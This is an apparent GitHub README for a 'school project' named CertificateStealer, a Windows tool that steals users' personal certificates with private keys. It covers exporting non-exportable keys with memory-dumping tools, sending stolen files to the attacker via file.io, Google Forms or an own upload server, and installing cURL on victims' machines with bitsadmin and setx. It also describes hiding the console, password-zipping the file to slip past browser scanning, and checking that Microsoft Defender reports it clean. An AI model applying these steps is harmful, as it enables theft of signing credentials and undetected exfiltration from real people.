# CertificateStealer
This is school Project - learning purpose only !


# <img src="./doc/SnakeBite.png" width="600" alt="SnakeBite">


TIMELINE:
------
The sooner the better ! <br>
I expect a lot of glitches and errors in the process <br>

TO DO:
------
- Cut audio record of project specifications to just this project.      ✅
- Make UML diagrams of program (UseCase diagram, Class diagram).        ❌
- Do research about certificates (storing, extracting, types,...).      ✅
- Make first testing version of program extracting certificates.        ✅
- Debug the first version.                                              ✅
- Rebuild program, upgrade version.                                     ✅
- Add transfering to (google disk, email, server, ....)                 ✅
- Checking/Installing cURL to computer                                  ✅
- Hide console (or show fake information)                               ✅
- Hide code (deobfuscate code).                                         ❌
- Try detecting with different antiviruses.                             ✅ - (defender, browser)
- Wrap the code to some application (make it background process).       ❌
- Final tests.                                                          ✅
- .....


Rewriten audio :
------
- certificates in operating systems (certmgr) - target on Personal certificates
- create malware which exports certificate WITH PRIVATE KEY ! (automaticaly) it can be circumvent by some techniques

minimal:

- automatic export of Personal certificates with PRIVATE KEYs

expanded:
- transport (send) exported(stolen) certificates to hacker (email, google drive, network,...) - try to HIDE it !
- exported certificates protect with password (easiest, widnows, in exporting phase set password) or some other techniques - to not be used by someone else (encrypt canal which we use to send them)

IMPORTANT experience gained after research:
------
Dont use Python (just Mimikatz is good for this job), it can be used but just for calling powershell functions. So instead of python use POWERSHELL ?

Personal certificates are stored in `dir cert:\currentuser\my` , you can list them and then export with easy powershell script, but certificates must have flag "exportable" otherwise they canot be exported with this method. In the other words certificates marked as NonExportable canot be exported through powershell function `Export-PfxCertificate`, so we have to use another method.

You can also find certificates in `%SystemDrive%\Documents and Settings\All Users\Application Data\Microsoft\Crypto\RSA\MachineKeys` and in registry `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\My\Certificates`, from registry you can export it and then on another computer modify registry to import certificate, but it canot be use to signing. It is possible to repair these imports with poweshell command `certutil -repairstore my <certificate-fingerprint>` - *NOT TESTED*.

Because we want export private keys too, we can use `Mimikatz` for exporting certificates with private keys, but it is detected by antiviruses.

So second option is to dump the private key from memory of running computer by ourself. There is one project on github which already did it (<b>just WIN7 and lower</b>) [github](https://github.com/luipir/ExportNotExportablePrivateKey) + for corectly working we need to get [vcredist_x86_2010.exe](https://www.microsoft.com/en-us/download/details.aspx?id=26999) for compiling `exportrsa/Release/exportrsa.exe`.

+ TESTED, worked + exported certificate is secured with password. - ideal state

❗❗❗

Windows 10 version of Exporting non exportable certificate: [github](https://github.com/iSECPartners/jailbreak/tree/master)

Need to check code and use just what we need + wrap for more functions. ✅

+ TESTED                                                                ✅
+ Rewritten to just needed functions (*trymyown* folder)                ✅

Transfering certificates (options):
------
- Upload on https://www.file.io/ (file gets auto delete after one download)
    - Then copy share link and write it in google forms: https://forms.gle/QSG9oaR2XfSXptkAA
    - And just Send form :) - it should work anonymously without login.
- http://leteckaposta.cz/ (30 days then remove)
    - same as above, link for downloading can be used more times.
- Own domain upload
    - *working* with my own domain and PHP file upload script on it. (need to handle how to get cURL on victims computer to be able to use it....) Win10 and laters should default have it. 

### Download cURL with cmd line:

- `bitsadmin /transfer curlDownloadJob /download /priority high https://curl.se/windows/dl-8.1.1_1/curl-8.1.1_1-win64-mingw.zip C:\Users\user\Download\curl.zip`
- extract to folder in system
- add to PATH `setx /M PATH "%PATH%;C:\curl"` (need admin rights not cleaver, must be run as ADMIN)
- reopen cmd and it can be used :)


## Build .exe program one clik run:

- Need to modify Visual Studio settings.
- Switch to "Release"
- Go to configuration
- Project Properties -> C/C++ -> Code Generation
- Here change "Runtime Library" to "/MT Multi-threaded" for static building (it will include all needed C++ libs in .exe, which will cause running on computer without instaled Visual Studio.)
- Then Folder Release is created, just file .exe is needed (file .pdb is for handing errors like programer/developer, not needed for users.)
- Wrap Release folder and send --> Woala Program is working on other computer.


### Add own icon:
- Used "Resource Hacker".
- Load .exe file.
- In tree select "Icon / Icon Group" and replace it.
- If there is not Icon in tree  structure -> add new Binary, select .ico file, rename *.ico and select it is Icon/ Icon Group.
- Save / or Save as to apply chnages, now the .exe has your icon and code is not corupted.

## Antivirus testing:

- Browsers                              ✅      -> added password to ZIP
- Microsoft Defender                    ✅      -> clean no sus
- ...                                   ❌✅    -> 
- ...                                   ❌✅    -> 


# Finall:

- Finall executable application is built in folder `finall` 